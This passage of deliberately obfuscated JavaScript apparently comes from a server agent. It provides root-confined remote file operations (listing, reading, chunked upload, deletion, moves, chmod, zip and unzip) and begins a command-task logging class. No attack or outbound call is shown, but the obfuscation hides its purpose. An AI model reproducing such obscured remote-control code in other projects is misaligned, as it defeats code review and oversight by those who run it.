                'jHpiV': function (n, o) {
                    return n === o;
                },
                'GpsaT': function (n, o) {
                    return n <= o;
                },
                'VfyzP': function (n, o) {
                    return n + o;
                },
                'FXNvZ': function (n, o) {
                    return n + o;
                },
                'ibIHE': function (n, o) {
                    return n + o;
                },
                'lNDgQ': function (n, o) {
                    return n + o;
                }
            }, c = a0l[c9(0x31f)](a);
        let d = -0x1;
        const f = Math[c9(0x58e)](0x0, b[c9(0x38d)](c[c9(0x650)], b['JyHGo'](0xffff, 0x16)));
        for (let n = b[c9(0x1ec)](c[c9(0x650)], 0x16); b[c9(0x3fd)](n, f); n--) {
            if (b[c9(0x291)](c[c9(0x78c)](n), 0x6054b50)) {
                d = n;
                break;
            }
        }
        if (b[c9(0x2ab)](d, 0x0))
            throw new Error(b[c9(0x4cf)]);
        const g = c[c9(0x7d2)](b[c9(0x5a4)](d, 0xa)), h = c[c9(0x78c)](b['JyHGo'](d, 0xc)), j = c['readUInt32LE'](b[c9(0x5a4)](d, 0x10)), k = [];
        let l = j;
        const m = j + h;
        for (let o = 0x0; b[c9(0x71b)](o, g) && l + 0x2e <= m; o++) {
            if (b[c9(0x460)](c['readUInt32LE'](l), 0x2014b50))
                break;
            const q = c['readUInt16LE'](b[c9(0x1d8)](l, 0x8)), r = c[c9(0x7d2)](b[c9(0x1eb)](l, 0xa)), s = c[c9(0x78c)](l + 0x10), t = c[c9(0x78c)](b[c9(0x3a7)](l, 0x14)), u = c[c9(0x78c)](b['xRmhH'](l, 0x18)), v = c['readUInt16LE'](b['xRmhH'](l, 0x1c)), w = c['readUInt16LE'](l + 0x1e), x = c[c9(0x7d2)](b['OmTkq'](l, 0x20)), y = c[c9(0x78c)](l + 0x26), z = c[c9(0x78c)](b[c9(0x4e1)](l, 0x2a)), A = c[c9(0x500)](b[c9(0x3f1)](l, 0x2e), b[c9(0x396)](l, 0x2e) + v)[c9(0x491)](b[c9(0x222)]);
            l += b[c9(0x2d7)](b[c9(0x4e1)](b[c9(0x4e1)](0x2e, v), w), x);
            const B = {
                'name': A,
                'isDir': A[c9(0x875)]('/') || b['rVBfM'](b['IbzvX'](y, 0x10), 0x0),
                'method': r,
                'crc': s,
                'size': u,
                'compressedSize': t,
                'encrypted': b[c9(0x460)](b[c9(0x870)](q, 0x1), 0x0),
                'zip64': b[c9(0x41b)](t, 0xffffffff) || b[c9(0x291)](u, 0xffffffff) || b[c9(0x291)](z, 0xffffffff),
                'data': null
            };
            if (!B['isDir'] && !B[c9(0x223)] && !B['zip64']) {
                if (b[c9(0x59c)](z + 0x1e, c[c9(0x650)]) && c[c9(0x78c)](z) === 0x4034b50) {
                    const C = c[c9(0x7d2)](z + 0x1a), D = c['readUInt16LE'](b[c9(0x20b)](z, 0x1c)), E = b['FXNvZ'](b['ibIHE'](z + 0x1e, C), D);
                    b[c9(0x59c)](b[c9(0x3a8)](E, t), c[c9(0x650)]) && (B[c9(0x64d)] = c[c9(0x500)](E, E + t));
                }
            }
            k[c9(0x24a)](B);
        }
        return k;
    }
    static [a0aW(0x705)](a) {
        const ca = a0aW, b = {
                'uDGiN': function (c, d) {
                    return c === d;
                }
            };
        if (b[ca(0x687)](a[ca(0x717)], 0x0))
            return a[ca(0x64d)];
        if (a[ca(0x717)] === 0x8)
            return a0n[ca(0x682)](a[ca(0x64d)]);
        throw new Error('Unsupported\x20zip\x20method:\x20' + a[ca(0x717)]);
    }
}
function a0b(a, b) {
    a = a - 0x148;
    const c = a0a();
    let d = c[a];
    if (a0b['PZxSex'] === undefined) {
        var e = function (h) {
            const i = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
            let j = '', l = '';
            for (let m = 0x0, n, o, p = 0x0; o = h['charAt'](p++); ~o && (n = m % 0x4 ? n * 0x40 + o : o, m++ % 0x4) ? j += String['fromCharCode'](0xff & n >> (-0x2 * m & 0x6)) : 0x0) {
                o = i['indexOf'](o);
            }
            for (let q = 0x0, r = j['length']; q < r; q++) {
                l += '%' + ('00' + j['charCodeAt'](q)['toString'](0x10))['slice'](-0x2);
            }
            return decodeURIComponent(l);
        };
        a0b['urZotN'] = e, a0b['TxtPHT'] = {}, a0b['PZxSex'] = !![];
    }
    const f = c[0x0];
    a0b['kLFUDY'] !== f && (a0b['TxtPHT'] = {}, a0b['kLFUDY'] = f);
    const g = a0b['TxtPHT'][a];
    return g === undefined ? (d = a0b['urZotN'](d), a0b['TxtPHT'][a] = d) : d = g, d;
}
class a0Y {
    static async [a0aW(0x6c2)](a, b = ![]) {
        const cb = a0aW, c = {
                'HbHUL': function (h, i) {
                    return h & i;
                },
                'EKaji': function (h, i) {
                    return h(i);
                },
                'diABO': function (h, i) {
                    return h || i;
                },
                'NWDDk': function (h, i) {
                    return h(i);
                },
                'VVUFt': cb(0x76d)
            }, d = a0o[cb(0x38c)](a0P[cb(0x5e6)], c[cb(0x5cd)](a, '.'));
        if (!c[cb(0x6f4)](a0W, d))
            throw new Error(c[cb(0x628)]);
        if (!a0l[cb(0x5ec)](d))
            throw new Error(cb(0x7c9));
        const f = [], g = h => {
                const cc = cb, i = a0l[cc(0x69a)](h);
                for (const j of i) {
                    const k = a0o[cc(0x2f9)](h, j), l = a0l[cc(0x380)](k), m = new a0L();
                    m[cc(0x3db)] = j, m[cc(0x2be)] = a0o[cc(0x4eb)](a0P['FILE_ROOT'], k), m[cc(0x55f)] = l[cc(0x535)]() ? cc(0x30c) : cc(0x40c), m[cc(0x463)] = l[cc(0x463)], m['mtime'] = l[cc(0x887)][cc(0x151)](), m[cc(0x275)] = this[cc(0x2f7)](l[cc(0x275)], l['isDirectory']()), m[cc(0x5fb)] = '0o' + c[cc(0x2db)](l[cc(0x275)], 0x1ff)['toString'](0x8), m[cc(0x2df)] = l[cc(0x5b4)] + ':' + l[cc(0x161)], f['push'](m), b && l[cc(0x535)]() && c[cc(0x811)](g, k);
                }
            };
        return c[cb(0x811)](g, d), f;
    }
    static async [a0aW(0x26c)](a) {
        const cd = a0aW, b = {
                'OQTZV': cd(0x30c),
                'RRjlS': 'file'
            }, c = [];
        for (const d of a) {
            const f = a0o[cd(0x38c)](a0P[cd(0x5e6)], d);
            if (!a0W(f))
                continue;
            try {
                const g = a0l[cd(0x380)](f), h = this['_checkAccess'](f, a0l[cd(0x3a1)][cd(0x643)]), i = this[cd(0x4a6)](f, a0l[cd(0x3a1)][cd(0x50b)]), j = this['_checkAccess'](f, a0l[cd(0x3a1)]['X_OK']), k = new a0M();
                k[cd(0x2be)] = a0o[cd(0x4eb)](a0P[cd(0x5e6)], f), k[cd(0x3db)] = a0o[cd(0x6c9)](f), k[cd(0x275)] = this[cd(0x2f7)](g[cd(0x275)], g['isDirectory']()), k[cd(0x5fb)] = '0o' + (g[cd(0x275)] & 0x1ff)[cd(0x491)](0x8), k[cd(0x55f)] = g[cd(0x535)]() ? b[cd(0x867)] : b['RRjlS'], k['readable'] = h, k[cd(0x6ee)] = i, k[cd(0x55c)] = j, c['push'](k);
            } catch (l) {
            }
        }
        return c;
    }
    static [a0aW(0x4a6)](a, b) {
        const ce = a0aW;
        try {
            return a0l[ce(0x7ca)](a, b), !![];
        } catch {
            return ![];
        }
    }
    static ['_parseMode'](a) {
        const cf = a0aW, b = {
                'rugnf': function (c, d) {
                    return c === d;
                },
                'yOMrX': 'number',
                'SUAof': function (c, d) {
                    return c === d;
                },
                'DXeSC': 'string'
            };
        if (b[cf(0x23d)](typeof a, b[cf(0x1a7)]))
            return a;
        if (b[cf(0x7e0)](typeof a, b['DXeSC'])) {
            const c = a[cf(0x343)]();
            if (/^[0-7]{3,4}$/[cf(0x4ef)](c))
                return parseInt(c, 0x8);
        }
        throw new Error('Unsupported\x20permission\x20format,\x20only\x20octal\x20strings\x20are\x20supported');
    }
    static [a0aW(0x2f7)](a, b) {
        const cg = a0aW, c = {
                'DWUgL': function (i, j, k) {
                    return i(j, k);
                }
            }, d = b ? 'd' : '-', f = [
                'r',
                'w',
                'x'
            ], g = (a & 0x1ff)[cg(0x491)](0x8)[cg(0x7bc)](0x3, '0');
        let h = d;
        for (const i of g) {
            const j = c[cg(0x324)](parseInt, i, 0xa);
            h += f['map']((k, l) => j & 0x4 >> l ? k : '-')[cg(0x2f9)]('');
        }
        return h;
    }
    static async [a0aW(0x283)](a, b = ![]) {
        const ch = a0aW, c = {
                'qYEaC': function (g, h) {
                    return g(h);
                },
                'vFOKX': ch(0x483),
                'lFMMW': function (g, h) {
                    return g(h);
                },
                'mtDmK': function (g, h) {
                    return g(h);
                },
                'KjZoO': 'error'
            }, d = [];
        for (const [g, h] of Object[ch(0x207)](a)) {
            const i = a0o[ch(0x38c)](a0P[ch(0x5e6)], g);
            if (!a0W(i)) {
                d['push']({
                    'path': g,
                    'requested': String(h),
                    'applied': '',
                    'mode_octal': '',
                    'status': c[ch(0x4bc)]
                });
                continue;
            }
            try {
                const j = this[ch(0x6a9)](h), k = m => {
                        a0l['chmodSync'](m, j);
                    };
                if (b && a0l[ch(0x5ec)](i) && a0l[ch(0x380)](i)['isDirectory']()) {
                    const m = n => {
                        const ci = ch;
                        k(n);
                        const o = a0l[ci(0x69a)](n);
                        for (const p of o) {
                            const q = a0o[ci(0x2f9)](n, p);
                            a0l[ci(0x380)](q)[ci(0x535)]() ? c[ci(0x663)](m, q) : k(q);
                        }
                    };
                    m(i);
                } else
                    k(i);
                const l = j['toString'](0x8);
                d[ch(0x24a)]({
                    'path': g,
                    'requested': c[ch(0x4ad)](String, h),
                    'applied': l,
                    'mode_octal': '0o' + l,
                    'status': 'ok'
                });
            } catch (n) {
                d[ch(0x24a)]({
                    'path': g,
                    'requested': c[ch(0x367)](String, h),
                    'applied': '',
                    'mode_octal': '',
                    'status': c['KjZoO'],
                    'message': n[ch(0x7df)]
                });
            }
        }
        const f = d['filter'](o => o[ch(0x7dc)] === 'ok')[ch(0x650)];
        return {
            'status': 'ok',
            'total': d['length'],
            'success': f,
            'results': d
        };
    }
    static async [a0aW(0x205)](a) {
        const cj = a0aW, b = {
                'tzCTH': cj(0x76d),
                'bXCgz': function (h, i) {
                    return h > i;
                },
                'bGYXE': function (h, i) {
                    return h * i;
                },
                'GYOab': cj(0x871),
                'Cgjvy': cj(0x736),
                'LICSt': cj(0x7f9),
                'DiHgF': cj(0x40f)
            }, c = a0o[cj(0x38c)](a0P[cj(0x5e6)], a);
        if (!a0W(c))
            throw new Error(b[cj(0x177)]);
        const d = a0l['statSync'](c);
        if (b[cj(0x27f)](d['size'], b[cj(0x280)](0x400, 0x400)))
            throw new Error(b['GYOab']);
        const f = a0l['readFileSync'](c), g = this['_isBinary'](f);
        return {
            'status': 'ok',
            'path': a0o['relative'](a0P[cj(0x5e6)], c),
            'content': g ? a0w['fromByteArray'](f) : f[cj(0x491)](b[cj(0x654)]),
            'encoding': g ? b[cj(0x7a4)] : b['DiHgF'],
            'is_binary': g,
            'size': d[cj(0x463)]
        };
    }
    static ['_isBinary'](a) {
        const ck = a0aW, b = {
                'AfIVs': function (c, d) {
                    return c < d;
                },
                'bbALs': function (c, d) {
                    return c === d;
                }
            };
        if (!a || a[ck(0x650)] === 0x0)
            return ![];
        for (let c = 0x0; b[ck(0x63d)](c, Math['min'](a[ck(0x650)], 0x200)); c++) {
            if (b[ck(0x825)](a[c], 0x0))
                return !![];
        }
        return ![];
    }
    static async ['uploadFile'](a, b, c, d = null, f = null) {
        const cl = a0aW, g = {
                'nGAZQ': function (l, m) {
                    return l(m);
                },
                'qrgIR': cl(0x76d),
                'hHZJp': function (l, m) {
                    return l > m;
                },
                'qhcEk': cl(0x871),
                'Vyiqp': function (l, m) {
                    return l !== m;
                },
                'XvlLE': cl(0x413),
                'kVGKw': cl(0x7f3),
                'pzWBs': function (l, m) {
                    return l < m;
                }
            }, h = a0o[cl(0x38c)](a0P[cl(0x5e6)], a);
        let j = h;
        b && (j = a0o[cl(0x2f9)](h, b));
        if (!g[cl(0x6d8)](a0W, j))
            throw new Error(g[cl(0x76e)]);
        !a0l[cl(0x5ec)](a0o[cl(0x236)](j)) && a0l[cl(0x1bd)](a0o[cl(0x236)](j), { 'recursive': !![] });
        const k = a0w[cl(0x570)](c);
        if (g[cl(0x6b1)](k[cl(0x650)], a0P['MAX_UPLOAD_SIZE']))
            throw new Error(g['qhcEk']);
        if (g[cl(0x2f8)](d, null) && f !== null) {
            const l = g['nGAZQ'](Number, d), m = Number(f);
            if (Number[cl(0x6fc)](l) || Number[cl(0x6fc)](m))
                throw new Error(g[cl(0x560)]);
            const n = a0o[cl(0x2f9)](a0o[cl(0x236)](j), g['kVGKw'], a0o['basename'](j));
            !a0l['existsSync'](n) && a0l['mkdirSync'](n, { 'recursive': !![] });
            const o = a0o['join'](n, cl(0x6d2) + l);
            a0l[cl(0x565)](o, k);
            const p = a0l['readdirSync'](n)['filter'](s => s[cl(0x2eb)](cl(0x6d2))), q = p[cl(0x650)], r = q === m;
            if (r) {
                const s = a0l[cl(0x39e)](j);
                for (let u = 0x0; g[cl(0x31a)](u, m); u++) {
                    const v = a0o[cl(0x2f9)](n, cl(0x6d2) + u);
                    if (!a0l[cl(0x5ec)](v)) {
                        s[cl(0x1e9)]();
                        throw new Error(cl(0x528) + u);
                    }
                    s['write'](a0l[cl(0x31f)](v));
                }
                s[cl(0x342)]();
                const t = a0o[cl(0x236)](n);
                a0l[cl(0x702)](n, {
                    'recursive': !![],
                    'force': !![]
                });
                try {
                    a0l[cl(0x6e3)](t);
                } catch (w) {
                }
            }
            return {
                'status': 'ok',
                'path': a0o[cl(0x4eb)](a0P[cl(0x5e6)], j),
                'received': q,
                'total': m,
                'chunked': !![]
            };
        }
        return a0l['writeFileSync'](j, k), {
            'status': 'ok',
            'path': a0o[cl(0x4eb)](a0P['FILE_ROOT'], j),
            'received': k[cl(0x650)],
            'total': k[cl(0x650)],
            'chunked': ![]
        };
    }
    static async [a0aW(0x5dc)](a, b, c, d = null, f = null) {
        const cm = a0aW, g = {
                'VapTU': function (k, l) {
                    return k || l;
                },
                'qxGVl': function (k, l) {
                    return k(l);
                },
                'hMxhD': 'Access\x20denied:\x20path\x20outside\x20root',
                'WFqRV': function (k, l) {
                    return k > l;
                },
                'zCDeO': cm(0x871),
                'BzdJG': function (k, l) {
                    return k !== l;
                },
                'eQvKD': function (k, l) {
                    return k(l);
                },
                'SCwAu': function (k, l) {
                    return k(l);
                },
                'ZbJcA': 'chunk_id\x20and\x20total_chunks\x20must\x20be\x20numeric',
                'MlLXJ': function (k, l) {
                    return k === l;
                },
                'Cnbnc': 'All\x20chunks\x20received.\x20File\x20merged\x20successfully.',
                'yJhuT': cm(0x7a1)
            }, h = a0o[cm(0x38c)](a0P[cm(0x5e6)], g[cm(0x5a3)](a, '.'));
        let j = h;
        b && (j = a0o[cm(0x2f9)](h, b));
        if (!g[cm(0x271)](a0W, j))
            throw new Error(g[cm(0x33e)]);
        !a0l['existsSync'](a0o['dirname'](j)) && a0l[cm(0x1bd)](a0o['dirname'](j), { 'recursive': !![] });
        if (g[cm(0x55b)](c[cm(0x650)], a0P[cm(0x803)]))
            throw new Error(g[cm(0x48a)]);
        if (g['BzdJG'](d, null) && f !== null) {
            const k = g[cm(0x1c5)](Number, d), l = g[cm(0x245)](Number, f);
            if (Number[cm(0x6fc)](k) || Number[cm(0x6fc)](l))
                throw new Error(g[cm(0x356)]);
            const m = a0o['join'](a0o['dirname'](j), cm(0x7f3), a0o[cm(0x6c9)](j));
            !a0l[cm(0x5ec)](m) && a0l[cm(0x1bd)](m, { 'recursive': !![] });
            const n = a0o[cm(0x2f9)](m, 'chunk_' + k);
            a0l[cm(0x565)](n, c);
            const o = a0l['readdirSync'](m)['filter'](r => r[cm(0x2eb)](cm(0x6d2))), p = o[cm(0x650)], q = g['MlLXJ'](p, l);
            if (q) {
                const r = [];
                for (let t = 0x0; t < l; t++) {
                    const u = a0o[cm(0x2f9)](m, cm(0x6d2) + t);
                    if (!a0l[cm(0x5ec)](u))
                        throw new Error(cm(0x528) + t);
                    r[cm(0x24a)](a0l[cm(0x31f)](u));
                }
                a0l[cm(0x565)](j, Buffer['concat'](r));
                const s = a0o[cm(0x236)](m);
                a0l[cm(0x702)](m, {
                    'recursive': !![],
                    'force': !![]
                });
                try {
                    a0l[cm(0x6e3)](s);
                } catch (v) {
                }
                return {
                    'status': 'ok',
                    'path': a0o[cm(0x4eb)](a0P[cm(0x5e6)], j),
                    'chunk_id': k,
                    'completed': !![],
                    'message': g[cm(0x181)]
                };
            }
            return {
                'status': 'ok',
                'path': a0o[cm(0x4eb)](a0P[cm(0x5e6)], j),
                'chunk_id': k,
                'completed': ![],
                'message': 'Chunk\x20' + k + cm(0x294)
            };
        }
        return a0l['writeFileSync'](j, c), {
            'status': 'ok',
            'path': a0o[cm(0x4eb)](a0P[cm(0x5e6)], j),
            'chunk_id': 0x0,
            'completed': !![],
            'message': g[cm(0x414)]
        };
    }
    static async [a0aW(0x178)](a) {
        const cn = a0aW, b = {
                'NZgML': function (g, h) {
                    return g(h);
                },
                'Vsktq': cn(0x1c8)
            }, c = a0o[cn(0x38c)](a0P[cn(0x5e6)], a);
        if (!b[cn(0x1a0)](a0W, c))
            throw new Error(cn(0x76d));
        if (!a0l[cn(0x5ec)](c))
            throw new Error(b[cn(0x1c2)]);
        const d = a0l[cn(0x380)](c), f = await a0l['promises'][cn(0x205)](c);
        return {
            'path': a0o[cn(0x4eb)](a0P[cn(0x5e6)], c),
            'content': f,
            'size': d[cn(0x463)]
        };
    }
    static async [a0aW(0x766)](a) {
        const co = a0aW, b = {
                'JMkmp': function (d, f) {
                    return d(f);
                },
                'iFHOt': co(0x483),
                'QZbdC': co(0x522),
                'xKUnT': co(0x487),
                'Ujhaw': co(0x5e7)
            }, c = [];
        for (const d of a) {
            const f = a0o[co(0x38c)](a0P['FILE_ROOT'], d);
            if (!b[co(0x482)](a0W, f)) {
                c['push']({
                    'path': d,
                    'status': b[co(0x32c)]
                });
                continue;
            }
            try {
                if (a0l['existsSync'](f)) {
                    const g = a0l[co(0x380)](f);
                    g[co(0x535)]() ? a0l[co(0x702)](f, {
                        'recursive': !![],
                        'force': !![]
                    }) : a0l[co(0x723)](f), c[co(0x24a)]({
                        'path': d,
                        'status': b['QZbdC']
                    });
                } else
                    c[co(0x24a)]({
                        'path': d,
                        'status': b[co(0x2d4)]
                    });
            } catch (h) {
                c[co(0x24a)]({
                    'path': d,
                    'status': b[co(0x1a5)],
                    'message': h['message']
                });
            }
        }
        return c;
    }
    static async [a0aW(0x7e1)](a) {
        const cp = a0aW, b = {
                'TsxEr': function (d, f) {
                    return d(f);
                },
                'nUdiX': 'access_denied',
                'FTsbf': 'error'
            }, c = [];
        for (const [d, f] of Object['entries'](a)) {
            const g = a0o['resolve'](a0P[cp(0x5e6)], d), h = a0o[cp(0x38c)](a0P[cp(0x5e6)], f);
            if (!b[cp(0x7c3)](a0W, g) || !a0W(h)) {
                c[cp(0x24a)]({
                    'from': d,
                    'to': f,
                    'status': b[cp(0x15e)]
                });
                continue;
            }
            try {
                const i = a0o[cp(0x236)](h);
                !a0l['existsSync'](i) && a0l['mkdirSync'](i, { 'recursive': !![] }), a0l['renameSync'](g, h), c[cp(0x24a)]({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (j) {
                c[cp(0x24a)]({
                    'from': d,
                    'to': f,
                    'status': b[cp(0x655)],
                    'message': j[cp(0x7df)]
                });
            }
        }
        return c;
    }
    static async [a0aW(0x843)](a) {
        const cq = a0aW, b = {
                'QlGGE': function (d, f) {
                    return d(f);
                },
                'JBHyf': function (d, f, g) {
                    return d(f, g);
                },
                'SjGPI': cq(0x5e7)
            }, c = [];
        for (const [d, f] of Object['entries'](a)) {
            const g = a0o['resolve'](a0P[cq(0x5e6)], d), h = a0o[cq(0x38c)](a0P[cq(0x5e6)], f);
            if (!b[cq(0x680)](a0W, g) || !a0W(h)) {
                c['push']({
                    'from': d,
                    'to': f,
                    'status': 'access_denied'
                });
                continue;
            }
            try {
                if (!a0l[cq(0x5ec)](g)) {
                    c[cq(0x24a)]({
                        'from': d,
                        'to': f,
                        'status': cq(0x487)
                    });
                    continue;
                }
                const i = a0o['dirname'](h);
                !a0l[cq(0x5ec)](i) && a0l[cq(0x1bd)](i, { 'recursive': !![] });
                const j = a0l[cq(0x380)](g);
                if (j[cq(0x535)]()) {
                    if (a0l[cq(0x6c0)])
                        a0l[cq(0x6c0)](g, h, { 'recursive': !![] });
                    else {
                        const k = (l, m) => {
                            const cr = cq;
                            if (a0l[cr(0x380)](l)['isDirectory']()) {
                                if (!a0l[cr(0x5ec)](m))
                                    a0l[cr(0x1bd)](m, { 'recursive': !![] });
                                for (const n of a0l[cr(0x69a)](l)) {
                                    k(a0o[cr(0x2f9)](l, n), a0o[cr(0x2f9)](m, n));
                                }
                            } else
                                a0l[cr(0x5e4)](l, m);
                        };
                        b[cq(0x2e1)](k, g, h);
                    }
                } else
                    a0l[cq(0x5e4)](g, h);
                c[cq(0x24a)]({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (l) {
                c[cq(0x24a)]({
                    'from': d,
                    'to': f,
                    'status': b[cq(0x68c)],
                    'message': l[cq(0x7df)]
                });
            }
        }
        return c;
    }
    static async [a0aW(0x6da)](a) {
        const cs = a0aW, b = {
                'BUPDG': function (d, f) {
                    return d(f);
                },
                'sIiCM': cs(0x76d)
            }, c = a0o[cs(0x38c)](a0P[cs(0x5e6)], a);
        if (!b['BUPDG'](a0W, c))
            throw new Error(b['sIiCM']);
        return a0l[cs(0x1bd)](c, { 'recursive': !![] }), {
            'status': 'ok',
            'path': a0o['relative'](a0P[cs(0x5e6)], c)
        };
    }
    static ['_displayPath'](a) {
        const ct = a0aW;
        return a0o[ct(0x4eb)](a0P[ct(0x5e6)], a) || '.';
    }
    static async [a0aW(0x187)](a, b, c = ![]) {
        const cu = a0aW, d = {
                'Iogbo': function (k, l, m) {
                    return k(l, m);
                },
                'Hvyfm': cu(0x434),
                'WLwEa': function (k, l) {
                    return k === l;
                },
                'rwsGL': 'items\x20required\x20(non-empty\x20array)',
                'fDgEI': function (k, l) {
                    return k(l);
                },
                'YWWeF': cu(0x76d),
                'RnvNs': cu(0x2ec),
                'yhIHa': function (k, l) {
                    return k || l;
                },
                'mQsDf': 'not_found'
            };
        if (!a)
            throw new Error(d[cu(0x863)]);
        if (!Array[cu(0x677)](b) || d['WLwEa'](b[cu(0x650)], 0x0))
            throw new Error(d[cu(0x7fc)]);
        const f = a0o[cu(0x38c)](a0P[cu(0x5e6)], a);
        if (!d['fDgEI'](a0W, f))
            throw new Error(d['YWWeF']);
        if (a0l[cu(0x5ec)](f) && a0l['statSync'](f)['isDirectory']())
            throw new Error(cu(0x38f) + a);
        a0l[cu(0x1bd)](a0o[cu(0x236)](f), { 'recursive': !![] });
        if (a0l[cu(0x5ec)](f))
            a0l[cu(0x723)](f);
        const g = a0X[cu(0x237)](f), h = [];
        let i = 0x0, j = ![];
        for (const k of b) {
            if (j) {
                h['push']({
                    'item': k,
                    'status': d[cu(0x668)],
                    'added': 0x0
                });
                continue;
            }
            const l = a0o['resolve'](a0P[cu(0x5e6)], d['yhIHa'](k, ''));
            try {
                if (!d[cu(0x757)](a0W, l)) {
                    h[cu(0x24a)]({
                        'item': k,
                        'status': cu(0x5e7),
                        'added': 0x0
                    });
                    continue;
                }
                if (!a0l[cu(0x5ec)](l)) {
                    h['push']({
                        'item': k,
                        'status': d[cu(0x688)],
                        'added': 0x0
                    });
                    continue;
                }
                const m = a0l[cu(0x380)](l);
                let n = 0x0, o = ![];
                if (m['isFile']()) {
                    if (!g['add'](a0o['basename'](l), a0l[cu(0x31f)](l), m[cu(0x887)])) {
                        j = !![], h[cu(0x24a)]({
                            'item': k,
                            'status': d[cu(0x668)],
                            'added': 0x0
                        });
                        continue;
                    }
                    n = 0x1;
                } else {
                    if (m[cu(0x535)]()) {
                        const p = a0o[cu(0x6c9)](l), q = (r, s) => {
                                const cv = cu;
                                for (const t of a0l[cv(0x69a)](r)) {
                                    const u = a0o[cv(0x2f9)](r, t), v = s ? s + '/' + t : t, w = a0l[cv(0x380)](u);
                                    if (w[cv(0x535)]()) {
                                        if (!g[cv(0x30f)](v + '/', Buffer[cv(0x605)](0x0), w['mtime'], !![])) {
                                            o = !![];
                                            return;
                                        }
                                        d[cv(0x198)](q, u, v);
                                        if (o)
                                            return;
                                    } else {
                                        if (w[cv(0x1b4)]()) {
                                            if (!g[cv(0x30f)](v, a0l['readFileSync'](u), w[cv(0x887)])) {
                                                o = !![];
                                                return;
                                            }
                                            n++;
                                        }
                                    }
                                }
                            };
                        d['Iogbo'](q, l, c ? '' : p);
                    } else {
                        h[cu(0x24a)]({
                            'item': k,
                            'status': 'error',
                            'added': 0x0
                        });
                        continue;
                    }
                }
                if (o) {
                    j = !![], i += n, h[cu(0x24a)]({
                        'item': k,
                        'status': cu(0x258),
                        'added': n
                    });
                    continue;
                }
                i += n, h['push']({
                    'item': k,
                    'status': 'ok',
                    'added': n
                });
            } catch (r) {
                h[cu(0x24a)]({
                    'item': k,
                    'status': cu(0x5e7),
                    'added': 0x0
                });
            }
        }
        return g[cu(0x1e9)](), {
            'status': 'ok',
            'path': a0Y[cu(0x210)](f),
            'entries': i,
            'size': a0l[cu(0x5ec)](f) ? a0l['statSync'](f)['size'] : 0x0,
            'results': h
        };
    }
    static async [a0aW(0x220)](a, b, c = !![], d = null) {
        const cw = a0aW, f = {
                'PNtAL': function (p, q) {
                    return p(q);
                },
                'bvexK': cw(0x76d),
                'FWgof': function (p, q) {
                    return p >= q;
                },
                'vDIgI': function (p, q) {
                    return p + q;
                },
                'WUYjt': function (p, q) {
                    return p > q;
                },
                'Qepmx': function (p, q) {
                    return p(q);
                },
                'sejjV': function (p, q) {
                    return p !== q;
                },
                'KrtDF': function (p, q) {
                    return p < q;
                }
            };
        if (!a)
            throw new Error(cw(0x434));
        const g = a0o[cw(0x38c)](a0P['FILE_ROOT'], a);
        if (!f[cw(0x2cf)](a0W, g))
            throw new Error(f[cw(0x748)]);
        if (!a0l[cw(0x5ec)](g))
            throw new Error(cw(0x447) + a);
        if (a0l[cw(0x380)](g)[cw(0x535)]())
            throw new Error(cw(0x1d0) + a);
        let h;
        if (b) {
            h = a0o[cw(0x38c)](a0P[cw(0x5e6)], b);
            if (!a0W(h))
                throw new Error(cw(0x76d));
            if (a0l['existsSync'](h) && !a0l['statSync'](h)[cw(0x535)]())
                throw new Error(cw(0x35e) + b);
        } else
            h = a0o[cw(0x236)](g);
        a0l[cw(0x1bd)](h, { 'recursive': !![] });
        let i;
        try {
            i = a0X[cw(0x4d3)](g);
        } catch (p) {
            throw new Error(cw(0x6a0) + a);
        }
        const j = (d || [])[cw(0x3cc)](q => q);
        let k = 0x0, l = 0x0, m = 0x0;
        const n = [];
        let o = ![];
        for (const q of i) {
            if (q[cw(0x63b)])
                continue;
            if (f['FWgof'](f[cw(0x86c)](k, l), a0X[cw(0x420)]) || f[cw(0x2b5)](m, a0X[cw(0x801)])) {
                l++;
                continue;
            }
            const r = q['name'][cw(0x676)](/\\/g, '/');
            if (j[cw(0x650)]) {
                const v = r[cw(0x4c0)]('/')[cw(0x452)]();
                if (!j[cw(0x41d)](r) && !j['includes'](v)) {
                    l++;
                    continue;
                }
            }
            if (q[cw(0x223)] || q[cw(0x2ce)] || f[cw(0x32d)](m + q[cw(0x463)], a0X[cw(0x801)])) {
                l++;
                continue;
            }
            const s = a0o['resolve'](h, r), t = a0o[cw(0x4eb)](h, s);
            if (t['startsWith']('..') || a0o[cw(0x443)](t)) {
                l++;
                continue;
            }
            if (!f[cw(0x6e5)](a0W, s)) {
                l++;
                continue;
            }
            let u;
            try {
                u = a0X[cw(0x705)](q);
            } catch (w) {
                l++;
                continue;
            }
            if (f['sejjV'](a0X[cw(0x507)](u), q['crc'])) {
                l++;
                continue;
            }
            if (!c && a0l['existsSync'](s)) {
                l++;
                continue;
            }
            try {
                a0l['mkdirSync'](a0o[cw(0x236)](s), { 'recursive': !![] }), a0l['writeFileSync'](s, u);
            } catch (x) {
                l++;
                continue;
            }
            k++, m += q['size'], f[cw(0x302)](n['length'], a0X[cw(0x4d4)]) ? n[cw(0x24a)](a0Y[cw(0x210)](s)) : o = !![];
        }
        return {
            'status': 'ok',
            'path': a0Y[cw(0x210)](g),
            'dest': a0Y['_displayPath'](h),
            'extracted': k,
            'skipped': l,
            'files': n,
            'files_truncated': o
        };
    }
}
class a0Z {
    static [a0aW(0x5ed)] = new Map();
    static [a0aW(0x5a2)](a, b) {
        const cx = a0aW, c = {
                'UIllz': function (d, f) {
                    return d - f;
                }
            };
        a['push'](b), a['length'] > a0P[cx(0x3f3)] && a[cx(0x362)](0x0, c[cx(0x229)](a['length'], a0P[cx(0x3f3)]));
    }
    static ['_formatLogEntry'](a, b, c, d, f = null) {
        const cy = a0aW, g = new Date()[cy(0x151)]();
        return {
            'ts': g,
            'cmd': a,
            'output': b,
            'exitcode': c,
            'type': d,
            'cron': f,
            'formatted': g + cy(0x6c8) + a + cy(0x153) + c + '\x0a' + (b?.['trim']() || '')
        };
    }
    static [a0aW(0x227)]() {
        const cz = a0aW;
        return {
            'status': 'ok',
            'count': a0P[cz(0x3ea)][cz(0x650)],
            'tasks': a0P[cz(0x3ea)]
        };
    }
    static async [a0aW(0x37b)](a) {
        const cA = a0aW, b = {
                'vOSil': function (d, f) {
                    return d < f;
                },
                'oKIty': cA(0x24b),
                'ToAGH': cA(0x5e7)
            };
        a0P[cA(0x3ea)] = a || [], a0P['InitTask'] = !![];
        const c = [];
